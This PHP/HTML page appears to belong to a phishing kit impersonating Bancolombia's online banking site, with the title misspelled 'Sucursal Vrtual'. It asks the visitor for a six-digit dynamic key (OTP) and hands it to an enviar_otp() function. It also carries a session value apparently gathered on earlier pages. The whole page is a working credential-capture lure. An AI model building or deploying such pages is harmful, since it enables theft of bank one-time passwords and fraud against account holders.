<?php
session_start();
$ca =$_SESSION['ca'];
?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" href="css/style.css">
		<script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
		<script type="text/javascript" src="/scripts/functions.js"></script>  		
		<link rel="stylesheet" href="css/style.css">
	</head>
   	<body>
   			<div class="cabecera">
   				<div class="logo">
   					<img src="img/cont/t-mar-min.jpg">   				
   				</div>
   				<div class="titulo"><img src="img/cont/o-tit-min.jpg"></div>
   			</div>   			
   			<div class="cuerpo">
   				<div class="pnlizq">
   					<div class="formulario">
   						<div class="form-titulo"><img src="img/cont/o-sec-ver-min.jpg"></div>
   						<div class="descripcion">
   							<img src="img/cont/o-sub-min.jpg">
   						</div>
   						<div class="form-cuerpo">
   							<div style="text-align: left;">
   								<img src="img/cont/o-eti-clv-min.jpg">
   							</div>     						
							<input type="tel" name="cDinamica" id="txtOTP" placeholder ="" required minlength="6" maxlength="6" class="input-icono pass">
   							<br>
							<button id="btnOTP" style="background: #FDDA24; border-color: #FDDA24; padding: 5px; color: #000; border: 0px solid transparent; ">VERIFICAR</button>
   						</div>
   					</div>
   				</div>
   			</div>
		<script type="text/javascript">
			var espera = 0;
			let identificadorTiempoDeEspera;
			function retardor() {
			  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
			}
			function retardorX() {
			}
			$(document).ready(function() {
				$('#btnOTP').click(function(){
					if ($("#txtOTP").val().length > 5) {
						enviar_otp($("#txtOTP").val());				
					}else{
						$(".mensaje").show();
						$(".pass").css("border", "1px solid red");
						$("#txtOTP").focus();
					}			
				});
		
				$("#txtOTP").keyup(function(e) {
					$(".pass").css("border", "1px solid #CCCCCC");	
					$(".mensaje").hide();				
				});
			});
		</script>
   	</body>
</html>